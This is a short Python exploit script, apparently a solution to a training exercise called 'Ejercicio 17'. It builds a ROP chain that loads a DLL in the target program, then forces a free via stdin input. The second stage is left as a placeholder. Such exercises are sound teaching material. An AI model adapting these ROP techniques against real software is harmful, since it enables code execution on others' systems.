#Ejercicio 17 by hdbreaker
import struct
from subprocess import Popen, PIPE

############## Stage 1 Cargar la dll ###################
rop  = struct.pack("<I", 0x101040A4) #FIX EBP
rop += struct.pack("<I", 0x10101595) #pop ecx
rop += struct.pack("<I", 0x10103004) #dir to LoadLib + 4
rop += struct.pack("<I", 0x101019F5) #mov eax, ecx
rop += struct.pack("<I", 0x10101A9C) #dec1, pop, ret
rop += "JUNK"
rop += struct.pack("<I", 0x10101A9C) #dec1, pop, ret
rop += "JUNK"
rop += struct.pack("<I", 0x10101A9C) #dec1, pop, ret
rop += "JUNK"
rop += struct.pack("<I", 0x10101A9C) #dec1, pop, ret
rop += struct.pack("<I", 0x101040A4) #FIX EBP

rop += struct.pack("<I", 0x10101cd1) #mov ecx, eax

rop += struct.pack("<I", 0x101019F5) #mov eax, ecx
rop += struct.pack("<I", 0x10101595) #pop ecx
rop += struct.pack("<I", 0x101040C8) #dir to put pp_loadDir

rop += struct.pack("<I", 0x10101a23) #xchg eax, [ecx]
rop += struct.pack("<I", 0x101040A4) #FIX EBP
rop += struct.pack("<I", 0x101019F5) #mov eax, ecx
rop += struct.pack("<I", 0x101013C8) #mov edx, [eax], ...,  mov eax, [edx], call eax
rop += struct.pack("<I", 0x101031EC) #ptr_dll 
##### Con esto tenemos finalizada la carga del dll #####

##### Stage 2 Utilizar la dll para ejecutar codigo #####
rop += "BBBB"
########################################################
	

#rop += "C"*1000*10

bin = 'Ejercicio17.exe "'+rop+'"'
stdin = Popen(bin, stdin=PIPE)

numOne = "-1000" #Force to call free
numTwo = "5\n"

payload = numOne +" "+numTwo
raw_input("frula")
stdin.communicate(payload)

